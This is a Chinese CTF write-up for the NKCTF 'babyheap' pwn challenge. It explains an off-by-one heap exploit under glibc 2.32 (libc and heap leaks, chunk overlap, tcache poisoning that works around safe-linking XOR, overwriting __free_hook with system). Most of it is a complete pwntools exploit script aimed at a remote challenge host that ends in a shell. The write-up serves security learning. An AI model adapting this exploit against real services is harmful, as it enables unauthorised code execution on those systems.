---
title: nkctf_babyrop
date: 2023-03-26 22:12:09
categories: 
- pwn_wp
tags: 
- pwn
- heap


---

nkctf的babyheap，用的glibc2.32，与前面的版本相比在`tcache`中加入的异或加密。这里的`tcache`也有了计数器，会记录`chunk`的个数。

但因为本地没有2.32的包，有点难调试，先按2.31写了再改为2.32的打远程。

<!-- more -->

在`my_read`里面有`off by one`。

思路挺常规的，先用`unsorted bin`泄露`libcbase`和`heapbase`，之后通过`off by one`修改`size`造成`overlapping`，通过修改`tcache`中`chunk`的`fd`指向`__free_hook`来把`__free_hook`申请出来，修改为`system`。

只是glibc2.32要注意`tcache`的异或加密，`new_fd=fd^(heapbase>>12)`。

这里的`tcache`也有了计数器，会记录`chunk`的个数，不过只要多释放一个再改第一个的`fd`就好了。

**exp:**

```py
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='pwn'
elf=ELF('./'+filename)
# libc=ELF('../story_attachment/libc.so.6') #local
libc=ELF("./libc-2.32.so") # remote
# p=process('./'+filename)
p=remote('node2.yuzhian.com.cn',)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    
def add(idx,size):
    ru("Your choice: ")
    sl("1")
    ru("Enter the index: ")
    sl(str(idx))
    ru("Enter the Size: ")
    sl(str(size))

def delete(idx):
    ru("Your choice: ")
    sl("2")
    ru("Enter the index: ")
    sl(str(idx))

def edit(idx,content):
    ru("Your choice: ")
    sl("3")
    ru("Enter the index: ")
    sl(str(idx))
    ru("Enter the content: ")
    s(content)

def show(idx):
    ru("Your choice: ")
    sl("4")
    ru("Enter the index: ")
    sl(str(idx))

add(0,0x28)
add(1,0x28)
add(2,0x80)
for i in range(8):
    add(i+3,0x80)
add(11,0x28)

payload=b'a'*0x28+b'\x61'
edit(0,payload)
delete(1)
add(1,0x58)

# leak heap_base and libc
for i in range(3,10):
    delete(i)
    
delete(2)
delete(10)

payload=b'a'*0x30+b'\n'
edit(1,payload)
show(1)
ru('\n')

# pause()
# sleep(0.1)

libc_addr=(uu64(ru('\n')[:-1])<<8)
libcbase=libc_addr-0x60-0x10-libc.sym['__malloc_hook']
leak("libcbase",hex(libcbase))
leak("libc_addr",hex(libc_addr))
pause()

free_hook=libcbase+libc.sym['__free_hook']

payload=b'a'*0x37+b'\n'
edit(1,payload)
show(1)
ru("\n")
heap_addr=uu64(ru("\n")[:-1])
heapbase=(heap_addr>>12)<<12

leak("libcbase",hex(libcbase))
leak("heapbase",hex(heapbase))

payload=b'a'*0x28+p64(0x90)+p64(libc_addr)+p64(heapbase+0x770)+b'\n'
edit(1,payload)

for i in range(7):
    add(i+3,0x80)

add(10,0x80)
# leak("libcbase",hex(libcbase))
# leak("heapbase",hex(heapbase))
# debug()
add(2,0x80)

delete(10)
delete(2)
payload=b'a'*0x28+p64(0x90)+p64(free_hook^(heapbase>>12))+p64(heapbase+0x770)+b'\n'
edit(1,payload)
add(12,0x80)
add(2,0x80)

# overwrite free_hook
payload=p64(libcbase+libc.sym['system'])+b'\n'
edit(2,payload)
edit(12,b"/bin/sh\x00\n")
delete(12)

itr()
```

